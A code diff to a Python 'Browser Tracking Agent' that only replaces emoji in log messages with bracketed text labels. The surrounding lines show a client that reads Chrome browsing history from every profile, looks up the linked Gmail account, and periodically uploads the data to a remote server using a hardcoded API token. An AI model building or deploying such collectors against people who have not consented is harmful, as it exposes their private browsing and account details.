@@ -33,9 +33,9 @@ class BrowserTrackingAgent:
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
         
-        print(f"🔍 Browser Tracking Agent v1.0")
-        print(f"📡 Server: {self.config['server_url']}")
-        print(f"⏱️  Interval: {self.config['check_interval']} seconds")
+        print(f"[SEARCH] Browser Tracking Agent v1.0")
+        print(f"[SERVER] Server: {self.config['server_url']}")
+        print(f"[TIME]  Interval: {self.config['check_interval']} seconds")
     
     def load_config(self):
         """Load configuration with fallback"""
@@ -45,7 +45,7 @@ class BrowserTrackingAgent:
                 config = json.load(f)
                 return config['client']
         except Exception as e:
-            print(f"⚠️ Error loading config: {e}")
+            print(f"[WARNING_SIGN] Error loading config: {e}")
             return {
                 "server_url": "https://browser-tracking.vercel.app",
                 "api_token": "BrowserTracker2024SecureToken",
@@ -65,7 +65,7 @@ class BrowserTrackingAgent:
             with open(self.status_file, 'w') as f:
                 json.dump(status_data, f, indent=2)
         except Exception as e:
-            print(f"⚠️ Error saving status: {e}")
+            print(f"[WARNING_SIGN] Error saving status: {e}")
     
     def get_status(self):
         """Get current agent status"""
@@ -79,7 +79,7 @@ class BrowserTrackingAgent:
     
     def signal_handler(self, signum, frame):
         """Handle shutdown signals"""
-        print(f"\n🛑 Received signal {signum}, shutting down gracefully...")
+        print(f"\n[STOP_SIGN] Received signal {signum}, shutting down gracefully...")
         self.stop_monitoring()
         sys.exit(0)
     
@@ -109,7 +109,7 @@ class BrowserTrackingAgent:
                 }
             }
         except Exception as e:
-            print(f"⚠️ Error getting system info: {e}")
+            print(f"[WARNING_SIGN] Error getting system info: {e}")
             return None
     
     def get_chrome_history(self, limit=50):
@@ -117,7 +117,7 @@ class BrowserTrackingAgent:
         try:
             chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
             if not os.path.exists(chrome_base):
-                print("⚠️ Chrome not found")
+                print("[WARNING_SIGN] Chrome not found")
                 return []
             
             all_history = []
@@ -194,17 +194,17 @@ class BrowserTrackingAgent:
                     conn.close()
                     os.unlink(temp_db)
                     
-                    print(f"📂 {profile_name}: {profile_entries} entries")
+                    print(f"[FOLDER] {profile_name}: {profile_entries} entries")
                     
                 except Exception as e:
-                    print(f"⚠️ Error reading {profile_name}: {e}")
+                    print(f"[WARNING_SIGN] Error reading {profile_name}: {e}")
                     continue
             
-            print(f"📊 Total: {len(all_history)} entries from {profiles_found} profiles")
+            print(f"[STATS] Total: {len(all_history)} entries from {profiles_found} profiles")
             return all_history[:self.config.get('batch_size', 50)]
             
         except Exception as e:
-            print(f"⚠️ Error getting Chrome history: {e}")
+            print(f"[WARNING_SIGN] Error getting Chrome history: {e}")
             return []
     
     def get_gmail_account(self, profile_path):
@@ -267,13 +267,13 @@ class BrowserTrackingAgent:
             return response.status_code == 200, response
             
         except Exception as e:
-            print(f"⚠️ Error sending data to {endpoint}: {e}")
+            print(f"[WARNING_SIGN] Error sending data to {endpoint}: {e}")
             return False, None
     
     def register_client(self):
         """Register client with server"""
         try:
-            print("📝 Registering client...")
+            print("[LOG] Registering client...")
             system_info = self.get_system_info()
             if not system_info:
                 return False
@@ -283,20 +283,20 @@ class BrowserTrackingAgent:
                 data = response.json()
                 if data.get('success'):
                     self.client_id = data.get('client_id')
-                    print(f"✅ Client registered with ID: {self.client_id}")
+                    print(f"[OK] Client registered with ID: {self.client_id}")
                     return True
             
-            print("❌ Failed to register client")
+            print("[ERROR] Failed to register client")
             return False
             
         except Exception as e:
-            print(f"⚠️ Error registering client: {e}")
+            print(f"[WARNING_SIGN] Error registering client: {e}")
             return False
     
     def collect_and_send_data(self):
         """Main data collection and transmission"""
         try:
-            print(f"\n🔄 Collecting data... ({datetime.now().strftime('%H:%M:%S')})")
+            print(f"\n[COUNTERCLOCKWISE] Collecting data... ({datetime.now().strftime('%H:%M:%S')})")
             
             # Ensure client is registered
             if not self.client_id:
@@ -306,30 +306,30 @@ class BrowserTrackingAgent:
             # Collect browsing history
             history = self.get_chrome_history(50)
             if not history:
-                print("ℹ️ No new data to send")
+                print("[INFO] No new data to send")
                 return True
             
             # Send browsing data
-            print(f"📤 Sending {len(history)} entries...")
+            print(f"[SEND] Sending {len(history)} entries...")
             success, response = self.send_data('browsing-data', {
                 'client_id': self.client_id,
                 'browsing_data': history
             })
             
             if success:
-                print(f"✅ Data sent successfully")
+                print(f"[OK] Data sent successfully")
                 return True
             else:
-                print(f"❌ Failed to send data")
+                print(f"[ERROR] Failed to send data")
                 return False
             
         except Exception as e:
-            print(f"⚠️ Error in collect_and_send_data: {e}")
+            print(f"[WARNING_SIGN] Error in collect_and_send_data: {e}")
             return False
     
     def monitoring_loop(self):
         """Main monitoring loop"""
-        print(f"🚀 Starting monitoring loop...")
+        print(f"[START] Starting monitoring loop...")
         self.save_status('running')
         
         while self.running:
@@ -347,19 +347,19 @@ class BrowserTrackingAgent:
                     time.sleep(1)
                     
             except Exception as e:
-                print(f"⚠️ Error in monitoring loop: {e}")
+                print(f"[WARNING_SIGN] Error in monitoring loop: {e}")
                 time.sleep(60)
         
         self.save_status('stopped')
-        print("🛑 Monitoring stopped")
+        print("[STOP_SIGN] Monitoring stopped")
     
     def start_monitoring(self):
         """Start monitoring in background thread"""
         if self.running:
-            print("⚠️ Monitoring already running")
+            print("[WARNING_SIGN] Monitoring already running")
             return False
         
-        print("🎯 Starting Browser Tracking Agent...")
+        print("[TARGET] Starting Browser Tracking Agent...")
         self.running = True
         self.monitor_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
         self.monitor_thread.start()
@@ -368,10 +368,10 @@ class BrowserTrackingAgent:
     def stop_monitoring(self):
         """Stop monitoring"""
         if not self.running:
-            print("ℹ️ Monitoring not running")
+            print("[INFO] Monitoring not running")
             return False
         
-        print("🛑 Stopping monitoring...")
+        print("[STOP_SIGN] Stopping monitoring...")
         self.running = False
         
         if self.monitor_thread and self.monitor_thread.is_alive():
@@ -383,24 +383,24 @@ class BrowserTrackingAgent:
     def test_connection(self):
         """Test connection to server"""
         try:
-            print("🔗 Testing server connection...")
+            print("[LINK] Testing server connection...")
             response = requests.get(f"{self.config['server_url']}/health", timeout=10)
             
             if response.status_code == 200:
                 data = response.json()
-                print(f"✅ Server online: {data.get('status', 'unknown')}")
+                print(f"[OK] Server online: {data.get('status', 'unknown')}")
                 return True
             else:
-                print(f"❌ Server returned status {response.status_code}")
+                print(f"[ERROR] Server returned status {response.status_code}")
                 return False
                 
         except Exception as e:
-            print(f"❌ Connection failed: {e}")
+            print(f"[ERROR] Connection failed: {e}")
             return False
     
     def run_once(self):
         """Run data collection once (for testing)"""
-        print("🧪 Running one-time data collection...")
+        print("[TEST] Running one-time data collection...")
         return self.collect_and_send_data()
 
 def main():
@@ -436,7 +436,7 @@ def main():
     
     else:
         # Interactive mode
-        print("\n🎮 Interactive Mode")
+        print("\n[GAME] Interactive Mode")
         print("Commands: start, stop, status, test, once, quit")
         
         while True:
